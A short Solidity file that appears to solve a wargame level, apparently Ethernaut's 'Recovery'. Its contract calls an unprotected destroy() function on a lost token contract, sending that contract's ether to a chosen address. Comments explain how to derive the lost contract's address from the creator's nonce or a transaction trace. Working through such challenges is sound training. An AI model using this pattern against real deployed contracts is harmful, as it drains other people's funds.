```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external ;
}

contract RecoverySolution {
    // To deduce the contract address we can either:
    // 1) Calculate it: ethers.utils.getContractAddress({ from: contract.address, nonce: 1 })
    // 2) Get it from the transaction trace (i.e. using blocksec phalcon explorer).
    function recover(address _from, address _to) external {
        ISimpleToken(_from).destroy(payable(_to));
    }
}
```
